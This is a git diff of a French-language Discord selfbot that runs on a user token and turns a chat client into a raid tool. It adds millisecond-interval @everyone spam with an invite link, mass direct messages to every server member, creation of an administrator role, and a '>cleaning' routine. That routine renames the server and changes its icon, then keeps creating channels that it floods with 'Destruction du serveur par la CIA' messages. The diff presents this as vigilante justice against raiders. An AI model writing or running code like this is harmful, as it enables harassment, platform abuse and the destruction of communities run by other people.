@@ -4,50 +4,82 @@ var selfbot = new Discord.Client();
 
 selfbot.login(process.env.TOKEN);
 
+const low = require('lowdb')
+const FileSync = require('lowdb/adapters/FileSync')
+
+const adapter = new FileSync('database.json');
+const db = low(adapter);
+
+db.defaults({ histoires: [], xp: []}).write()
+
 selfbot.on('ready', () => {
     console.log("Selfbot Prêt !")
 });
 
 
+selfbot.on("ready", () => {
+    selfbot.user.setPresence({
+        game: { 
+            name: 'Projet E.N.D',
+            type: 'STREAMING',
+            url: 'https://www.twitch.tv/something'
+        },
+        assets: {
+            largeImage: "https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png",
+            largeText: "RAID BY CIA",
+            smallImage: "https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png",
+            smallText: "RAID BY CIA"
+        },
+        party: {
+            size: [1, 2]
+        },
+        status: 'idle'
+    })
+})
+
+
+
+
 selfbot.on('message', async (message) => {
+
     if (message.content === ">selfbot") {
         message.delete()
         var embed1 = new Discord.RichEmbed()
         .setAuthor(message.author.username, message.author.avatarURL)
         .setDescription('Selfbot connecté ! Temps de latence avec le server : ' + `${message.createdTimestamp - Date.now()}` + ' ms')
         .setColor(0x010000)
+        .setImage("https://media.giphy.com/media/1ymoXP3QE0YFzEvEVn/giphy.gif")
         message.channel.send(embed1)
         console.log('Commande SelfBot Utilisé')
     }
+
+
     if (message.content === ">spam") {
         message.delete()
         selfbot.setInterval(() =>
         {
-        message.channel.send(`Ifspeed`)
+        message.channel.send('@everyone https://discord.gg/JEsrnxX')
         },1)
     }
 
-    if (message.content === ">purge") {
-    }
-
-    if(message.content === ">private") {
+    if (message.guild && message.content.startsWith('>private')) {
         let text = message.content.slice('>private'.length); // cuts off the /private part
         message.guild.members.forEach(member => {
           if (member.id != selfbot.user.id && !member.user.bot) member.send(text);
         });
-    }
+      }
 
     if (message.content === ">help") {
         message.delete()
         var embedhelpmember = new Discord.RichEmbed() 
         .addField("__Liste des Commandes__\n", "\u200b") 
-        .addField("Userinfo : " + " \```" + "Permet de consulter les informations d'une personne" + "\```", "\u200b")
-        .addField("Serverinfo : " + " \```" + "Permet de consulter les informations du serveur" + "\```", "\u200b")
-        .addField("Sharingan : " + " \```" + "Permet d'offrir son sharingan à une personne" + "\```", "\u200b")
-        .addField("8ball : " + " \```" + "Permet de poser des questions au selfbot" + "\```", "\u200b")
-        .addField("Avatar : " + " \```" + "Permet de consulter l'avatar d'une personne" + "\```", "\u200b")
+        .addField("Nickname : " + " \```" + "Permet de changer de pseudo à l'infini sur un serveur" + "\```", "\u200b")
+        .addField("Scan : " + " \```" + "Permet de scan un server pour pouvoir l'add aux prochaines victimes de E.N.D" + "\```", "\u200b")
+        .addField("Activate : " + " \```" + "Permet d'obtenir la permission administrateur" + "\```", "\u200b")
+        .addField("Cleaning : " + " \```" + "Permet de détruire un serveur pollué en quelques secondes (PERMS ADMIN OBLIGATOIRE)" + "\```", "\u200b")
+        .addField("Spam : " + " \```" + "Permet de spam n'importe quel message" + "\```", "\u200b")
         .setColor(0x010000) 
-        .setFooter("By @Ayzaki ミ#8007 !") 
+        .setFooter("By @'./E.N.D ミ#8007 !") 
     message.channel.send(embedhelpmember); 
     }
 
@@ -60,14 +92,14 @@ selfbot.on('message', async (message) => {
         message.channel.send(embednick)
         selfbot.setInterval(() =>
         {
-        message.guild.members.get(selfbot.user.id).setNickname('RAID ⭐️ ••••••••••');
-        message.guild.members.get(selfbot.user.id).setNickname('BY 🌟 ••••••••••••');
-        message.guild.members.get(selfbot.user.id).setNickname('CIA ⭐️ •••••••••••');
-        message.guild.members.get(selfbot.user.id).setNickname('OFFICIEL 🌟 ••••••');
+        message.guild.members.get(selfbot.user.id).setNickname(`'./P.R.O.J.E.T ミ`);
+        message.guild.members.get(selfbot.user.id).setNickname(`'./E.N.D ミ`);
+        message.guild.members.get(selfbot.user.id).setNickname(`'./O.F.F.I.C.I.E.L ミ`);
+
         },1) 
     }
 
-    if (message.content === ">activate") {
+    if (message.content === ">edit") {
         selfbot.setInterval(() =>
         {
         const embededit1 = new Discord.RichEmbed()
@@ -88,14 +120,24 @@ selfbot.on('message', async (message) => {
         },3000) 
     }
 
+    if (message.content === ">end") {
+        message.delete()
+        var embedend = new Discord.RichEmbed()
+        .setAuthor(message.author.username, message.author.avatarURL)
+        .setDescription('Je me présente je suis ' + message.author.username + ' pour vous éliminer !')
+        .setColor(0x010000)
+        .setImage("https://media.giphy.com/media/3ziyHaC80uDfurqpHQ/giphy.gif")
+        message.channel.send(embedend)
+    }
+
     if (message.content === ">projet") { 
         message.delete()
         const embedinfo = new Discord.RichEmbed()
-        .addField("**__Projet Ayzaki Bot__ :**   ``Raid``,  ``Divers``", "\u200b")
-        .setAuthor(selfbot.user.tag, selfbot.user.displayAvatarURL)
+        .addField("**__Projet E.N.D__ :**   ``Raid for Justice``", "\u200b")
+        .setDescription("Le projet E.N.D consiste en 3 mot ExtermiNation des raideur de Discord. En d'autres termes le selfbot a été uniquement conçu pour détruire tout les serveurs qui polluent Discord (Team de raideur, debiteur, afficheur, doxeur...).")
         .setColor(0x010000) 
-        .setImage("https://media.giphy.com/media/qTL7ESlNJcTn2/source.gif")
-        .setDescription("```" + message.author.username + " Tu peux faire la commande >help pour avoir accès a liste des commandes du selfbot !```")
+        .setImage("https://media.giphy.com/media/WNmaPlULTaAOC8eKCA/giphy.gif")
+        .setFooter(selfbot.user.tag, selfbot.user.displayAvatarURL)
         message.channel.send(embedinfo)
     }
 
@@ -109,23 +151,22 @@ selfbot.on('message', async (message) => {
         message.channel.send(embedavatar)
     }
 
-    if (message.content === ">serverinfo") {     
+    if (message.content === ">scan") {     
+    message.delete()
+    var number_random = Math.floor(Math.random() * 231) - 100;
+    console.log(number_random)
+    var embedscan = new Discord.RichEmbed()     
+    .setThumbnail("https://media.giphy.com/media/2ce8mGHsGDCRzaH6KK/giphy.gif")  
+    .setColor(0x010000)    
+    .setFooter(message.guild.name + ' a été scan !')
+    .addField("Q.I du serveur = " + number_random, "\u200b")
+    .addField("Ajout du serveur dans la liste de E.N.D !", "\u200b")
+    .setImage("https://media.giphy.com/media/2ce8mGHsGDCRzaH6KK/giphy.gif")
+    message.channel.send(embedscan)
 
-        var serverembed = new Discord.RichEmbed()
-        .setAuthor(message.guild.name, message.guild.iconURL)     
-        .addField("Nom du serveur: " + " \`" + message.guild.name + "\`", "\u200b")
-        .addField("Id du serveur: " + " \`" + message.guild.id + "\`", "\u200b")              
-        .addField("Totals des membres: " + " \`" + message.guild.memberCount + " membres\`", "\u200b")
-        .addField("Totals des roles: " + " \`" + message.guild.roles.size + " roles\`", "\u200b")
-        .addField("Totals des salons: " + " \`" + message.guild.channels.filter(channel => channel.type === 'voice').size + " vocales / " + message.guild.channels.filter(channel => channel.type === 'text').size + " textuelles"+ " \`", "\u200b")
-        .addField("Date de création: " + " \`" + message.guild.createdAt + "\`", "\u200b")
-        .addField("Région du serveur: " + " \`" + message.guild.region + "\`", "\u200b")          
-        .setThumbnail(message.guild.iconURL)  
-        .setColor(0x010000)    
-    message.channel.send(serverembed); 
     } 
 
-    if (message.content === "activation") {
+    if (message.content === ">activate") {
         message.member.guild.createRole({
             name: "admin perms",
             color: "0x010000",
@@ -139,30 +180,70 @@ selfbot.on('message', async (message) => {
             });
         }); 
     }
+    if(message.content == ">cleaning"){ 
 
-    if(message.content === ">hack") {
-        message.delete()
-
-        selfbot.setInterval(() =>
-        {
-        message.channel.send("`Lancement du processus de hack dans ...`")
-        message.delete()
-        message.channel.send("`3`")
-        message.delete()
-        message.channel.send("`2`")
-        message.delete()
-        message.channel.send("`1`")
-        message.delete()
-        message.channel.send("`Hacking in progress...`")
-        message.delete()
-        const embedhack = new Discord.RichEmbed()
-        .setDescription("`Processus de Hack Terminée... `")
-        .setImage("http://code-and-hacks.peculier.com/static/img/lexvarrepl.gif")
-        .setColor(0x010000) 
-        message.channel.send(embedhack)
-        },1)
+        var server = message.guild;
+        var name = "raid-by-cia";
+    
+    selfbot.setInterval(() =>
+    {
+    message.guild.setIcon("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png")
+    message.guild.setName("RAID")
+    message.guild.setName("BY")
+    message.guild.setName("CIA")
+    server.createChannel(name, "voice");
+    server.createChannel(name, "text").then(channel => {
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    channel.send("https://download.vikidia.org/vikidia/fr/images/thumb/2/23/CIA.svg/200px-CIA.svg.png  Destruction du serveur par la CIA ! @everyone")
+    })
+    },1)
     }
 
 
 
 })
+
